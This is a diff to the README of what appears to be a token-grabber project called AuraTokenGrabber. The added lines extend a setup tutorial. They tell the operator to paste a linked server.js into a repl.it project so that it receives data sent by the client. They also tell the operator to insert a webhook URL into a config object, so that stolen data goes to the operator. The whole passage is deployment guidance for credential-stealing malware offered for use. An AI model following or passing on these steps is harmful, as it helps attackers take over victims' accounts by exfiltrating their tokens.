@@ -77,7 +77,15 @@ build EXE: npm run build
 ---
 ### [TUTORIAL](#tutorial) USE Mode of use
 
-> Create a new project on repl.it to create the API server. This is where you will receive the data sent by the client. (Just copy the contents of [server api] and paste it into your repl.it index file). Once you do that, you will have the receiving API set up.
+> Create a new project on repl.it to create the API server. This is where you will receive the data sent by the client. (Just copy the contents of [Server api](https://raw.githubusercontent.com/k4itrun/AuraTokenGrabber/main/desktopServer/server.js) and paste it into your repl.it index file). Once you do that, you will have the receiving API set up.
+
+> Add your webhook URL in
+
+```js
+12 | x = { //added new webhook URL
+    webhookURL: "URL"
+    }
+```
 
 > Now, in the client section, go to (client) and change line 10 in client.js file:
 
